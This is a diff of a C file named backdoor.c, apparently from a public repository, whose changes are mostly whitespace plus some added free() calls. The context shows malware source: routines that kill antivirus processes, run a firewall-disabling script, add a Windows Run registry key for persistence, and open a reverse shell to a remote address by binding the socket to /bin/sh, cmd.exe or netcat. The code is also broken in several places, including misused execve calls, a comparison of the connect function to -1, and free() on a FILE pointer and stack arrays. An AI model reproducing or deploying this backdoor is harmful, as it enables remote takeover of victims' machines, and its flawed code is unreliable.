@@ -1,13 +1,13 @@
 
 /*
 // Version 1.0.0 
+//
 // Contribuition by: https://github.com/Sphinxs
+//
 // Compile : cc backdoor.c -lm -w
 //
 // List processes : ps aux
 */
-
-// Libs
 
 #include <stdio.h>
 
@@ -51,9 +51,9 @@
 
 typedef struct {
   int remote_addr;
-
+ 
   int remote_port;
-
+ 
   int x;
 } Target;
 
@@ -100,7 +100,7 @@ int main() {
         perror("kill firewall failed");
         else
             kill_firewall();
-
+        
         sleep(0.2);
     }
 
@@ -123,12 +123,12 @@ void kill_antivirus() {
     // Kill anti-virus
 
     FILE *arq = fopen("av.txt", "rb");
-
+    
     if(arq == NULL)
         return;
     else {
         dup2(x,0);
-
+        
         dup2(x,1);
     }
 
@@ -137,15 +137,17 @@ void kill_antivirus() {
     send(x,"Killing anti virus...\n", 31, 0);
 
     execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);
+
+    free(arq);
 }
 
 void kill_firewall() {
     // Kill firewall
 
     dup2(x, 0);
-
+    
     execve("firewall.vbs", 0, 0);
-
+    
     // execve("firewall.vbs", (char* const*)"", (char* const*)"");
 }
 
@@ -155,8 +157,8 @@ void auto_copy() {
     dup2(x, 0);
 
     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe", 0, 0);
-
-    execve("cp wopnt.exe /usr/bin", 0, 0);
+    
+    execve("cp wopnt.exe /usr/bin", 0, 0); 
 }
 
 void copy_to_registry() {
@@ -183,7 +185,7 @@ void shell() {
     // Background shell
 
     struct sockaddr_in s;
-
+  
     int root;
 
     char *window[] = {"HOME=/usr/home", "LOGNAME=home", (char *)0 };
@@ -202,7 +204,7 @@ void shell() {
         exit(EXIT_FAILURE);
 
     signal(SIGCHLD, SIG_IGN);
-
+    
     signal(SIGHUP, SIG_IGN);
 
     pid = fork();
@@ -221,21 +223,21 @@ void shell() {
         // Setting up the connection
 
         memset(s.sin_zero, '\0', sizeof s.sin_zero); // Allocates memory to pipe socket
-
+    
         s.sin_family = AF_INET; // Protocols family
 
         s.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-
+    
         s.sin_port = htons(REMOTE_PORT);
 
         x = socket(AF_INET, SOCK_STREAM, 0); // Instantiate a socket
 
         // sleep(120);  // If slow connection, sleep for 2 minutes untill made the connection
-
+    
         // When connection arrives, I've got the backdoor control
 
         (connect(x, (struct sockaddr *)&s, sizeof(s)));
-
+        
         if (connect == -1)
             perror("Socket(SOCKET_CONNECT) failed");
 
@@ -249,7 +251,7 @@ void shell() {
         // Made the connection and enter in a shell
 
         // send(x,"\n\033[32mSocket created\033[37m",18,0);
-
+        
         // send(x,"\nConnected in \033[34mmachine\033[37m\n", 50, 0);
 
         if(connect == -1)
@@ -258,21 +260,25 @@ void shell() {
             send(x, "\nConnected in \033[34mmachine\033[37m as \033[31mroot\033[37m\n", 100, 0);
 
         send(x, "\n", 5, 0);
-
+        
         // fflush(stdout); // Don't clear the buffer
 
         dup2(x, 0);
-
+        
         dup2(x, 1);
-
+        
         dup2(x, 2);
-
+        
         root = execve("/bin/sh", cmd,  window);
-
+        
         execve("C:\\windows\\System32\\cmd.exe ", cmd, window);
-
+        
         execve("netcat", cmd, window);
 
         // while(true); // Creates the loop
     } // End for
+
+    free(window);
+
+    free(cmd);
 }
